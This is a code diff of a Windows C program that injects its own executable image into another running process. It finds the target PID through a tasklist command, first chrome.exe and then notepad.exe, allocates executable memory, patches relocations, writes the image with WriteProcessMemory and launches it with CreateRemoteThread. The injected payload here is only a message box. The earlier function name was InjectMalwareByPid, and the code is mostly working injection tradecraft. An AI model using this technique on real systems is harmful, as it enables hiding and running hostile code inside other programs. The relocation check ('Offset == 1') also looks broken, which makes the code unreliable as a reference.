@@ -8,12 +8,17 @@
 #include<stdlib.h>
 #include<String.h>
 //Globals and consts
-#define INJECTED_PROCESS_COMMAND "Tasklist | findstr chrome.exe"
+#define INJECTED_PROCESS_COMMAND "Tasklist | findstr notepad.exe"
+
 //This is the function that will be the entry of the run in thr remote process
 //The run of the malicious code will start from here
 int InjectionEntryPoint()
 {
-	MessageBoxA(NULL, "HEY", "HEY", NULL);
+	wchar_t Buffer[300] = { NULL };
+	GetModuleFileName(GetModuleHandle(NULL), Buffer, 300);
+
+	MessageBox(NULL, L"This is the code from the injection entry point!!", Buffer, 0);
+	return 0;
 
 }
 
@@ -63,79 +68,129 @@ DWORD GetProcessPid(char ProcessName[])
 	return (DWORD)IntProcessId;
 }
 
-int InjectMalwareByPid(DWORD Pid)
+int ProcessInjection(DWORD Pid)
 {
-	DWORD RemoteAddress = NULL;
 
-	
-	HANDLE Process = OpenProcess(MAXIMUM_ALLOWED, FALSE, Pid);
-	//Getting the sizeofimage
-	void* LocalProcess = GetModuleHandle(NULL);
-	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)LocalProcess;
-	PIMAGE_NT_HEADERS NtHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)LocalProcess + DosHeader->e_lfanew);
-	//Allocating remote memory
-	RemoteAddress = VirtualAllocEx(Process, NULL, NtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
-	//Allocating local memory
-	void* PatchedImage = VirtualAlloc(NULL, NtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
-	//Copying the current image
-	memcpy(PatchedImage, (void*)LocalProcess, NtHeaders->OptionalHeader.SizeOfImage);
-	//Getting to the reloc table of the Patched image
-	PIMAGE_BASE_RELOCATION RelocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)PatchedImage + NtHeaders->OptionalHeader.DataDirectory[5].VirtualAddress);
-	//Delta between images
-	DWORD_PTR Delta = (DWORD_PTR)RemoteAddress - (DWORD_PTR)LocalProcess;
-	//Iterating the reloc table and patching the addresses
+
+	//The current exe image base addr. the first header in the exe is the DOS-HEADER.
+	//Any addr in the exe is relative to the image base (RVA).
+	PVOID CurrentImage = GetModuleHandle(NULL);
+	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)CurrentImage;
+
+
+
+
+	//Inside the DOS-HEADER the e_lfanew field contains 
+	//the addr of the next hedaer, the NT-HEADER
+	//in order to get the actual address of NTHEDAER and not just the rva the
+	//addres will be the sum of the image base and the elfnaw
+	PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)CurrentImage + DosHeader->e_lfanew);
+
+
+	// Allocating a new memory block that will contain the while PE image
+	PVOID MainImage = VirtualAlloc(
+		NULL,
+		NtHeader->OptionalHeader.SizeOfImage,
+		MEM_COMMIT,
+		PAGE_READWRITE);
+
+
+	//copying the curent PE image to a temp memory block
+	memcpy(MainImage,
+		CurrentImage,
+		NtHeader->OptionalHeader.SizeOfImage);
+
+	//Openning the remote process prior to the process identifier extracted from tasklist
+	HANDLE RemoteInjectedProcess = OpenProcess(
+		MAXIMUM_ALLOWED,
+		FALSE,
+		(DWORD)Pid);
+
+
+	// Allocating a new memory block on the target process
+	PVOID targetImage = VirtualAllocEx(
+		RemoteInjectedProcess,
+		NULL,
+		NtHeader->OptionalHeader.SizeOfImage,
+		MEM_COMMIT,
+		PAGE_EXECUTE_READWRITE);
+
+	//because of the fact that the process will be loaded into a new image,
+	//it's image base addr might be changed but the other addreses in the relocation
+	//table remain the same so we must change the values in the reloc table prior the 
+	//change in the image base addrs
+	//now ill edit the copy of the image relocation table so that the new 
+	//process will be able to resolve the adresses currectly
+	DWORD_PTR DifferenceBetweenImages = (DWORD_PTR)targetImage - (DWORD_PTR)CurrentImage;
+
 
 
 	PDWORD_PTR PatchedAddresses;
+
 	PBASE_RELOCATION_ENTRY RelocTableRelativeAddress = 0;
-	DWORD Entries = 0;
 
 
-	while (RelocationTable->SizeOfBlock > 0)
+
+	//getting to the relocation table of the
+	//memory copy by adding the base image with the 
+	//RVA of nthedaer=>optionalheader=>DataDirectories=>virtual address
+	PIMAGE_BASE_RELOCATION RelocTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)MainImage + NtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+
+	//will be used in the inner loop in order to iterate each relocation entry
+	DWORD RelocEntriesCounter = 0;
+
+
+
+	while (RelocTable->SizeOfBlock > 0)
 	{
 		//the number of entries is calculating by getting to the relocation's table block,
 		// the block size that contains the size of the image base relocation.
 		//by substracting the image base relocation size well get the size only 
 		//of the block. each block contains 2 bytes, 1 for address and 1 for type
-		Entries = (RelocationTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / (sizeof(int) / 2);
+		RelocEntriesCounter = (RelocTable->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / (sizeof(int) / 2);
 		//proceeding blocks
-		RelocTableRelativeAddress = (PBASE_RELOCATION_ENTRY)(RelocationTable + 1);
+		RelocTableRelativeAddress = (PBASE_RELOCATION_ENTRY)(RelocTable + 1);
 
-		for (short i = 0; i < Entries; i++)
+		for (short i = 0; i < RelocEntriesCounter; i++)
 		{
 			if (RelocTableRelativeAddress[i].Offset == 1)
 			{
-				PatchedAddresses = (PDWORD_PTR)((DWORD_PTR)PatchedImage + RelocationTable->VirtualAddress + RelocTableRelativeAddress[i].Offset);
-				*PatchedAddresses += Delta;
+				PatchedAddresses = (PDWORD_PTR)((DWORD_PTR)MainImage + RelocTable->VirtualAddress + RelocTableRelativeAddress[i].Offset);
+				*PatchedAddresses += DifferenceBetweenImages;
 			}
 		}
-		RelocationTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)RelocationTable + RelocationTable->SizeOfBlock);
+		RelocTable = (PIMAGE_BASE_RELOCATION)((DWORD_PTR)RelocTable + RelocTable->SizeOfBlock);
 	}
 
+	// Write the relocated localImage into the target process
+	WriteProcessMemory(
+		RemoteInjectedProcess,
+		targetImage,
+		MainImage,
+		NtHeader->OptionalHeader.SizeOfImage,
+		NULL);
 
-	//Injecting our whole p-atched image to the remote process using Ntdll!WriteProcessMemory
-	WriteProcessMemory(Process, RemoteAddress, PatchedImage, NtHeaders->OptionalHeader.SizeOfImage, NULL);
-	//Creating a remote threa that will run the injected image in the target's procees memory space
+	// Start the injected PE inside the target process
 	CreateRemoteThread(
-		Process,
+		RemoteInjectedProcess,
 		NULL,
 		0,
-		(LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + Delta),
+		(LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + DifferenceBetweenImages),
 		NULL,
 		0,
 		NULL);
 
-
-	
-	
+	return 0;
 }
+
+
 
 
 
 int main()
 {
-	InjectMalwareByPid(GetProcessPid(INJECTED_PROCESS_COMMAND));
+	ProcessInjection(GetProcessPid(INJECTED_PROCESS_COMMAND));
 	
 }
 
